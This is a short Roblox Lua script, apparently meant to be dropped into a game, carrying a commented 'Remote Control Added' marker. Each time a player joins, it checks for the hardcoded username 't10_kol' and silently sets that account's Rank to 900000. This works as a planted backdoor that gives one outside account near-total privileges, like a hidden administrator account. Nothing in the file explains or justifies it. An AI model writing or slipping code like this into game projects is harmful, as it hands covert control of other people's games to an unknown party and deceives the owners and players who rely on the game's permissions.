--print("Remote Control Added") test
local Players = game.Players
Players.PlayerAdded:Connect(function(plr)
    repeat wait() until plr:FindFirstChild("Rank") ~= nil
    if plr.Name == "t10_kol" then
        plr:FindFirstChild("Rank").Value = 900000
    end
end)
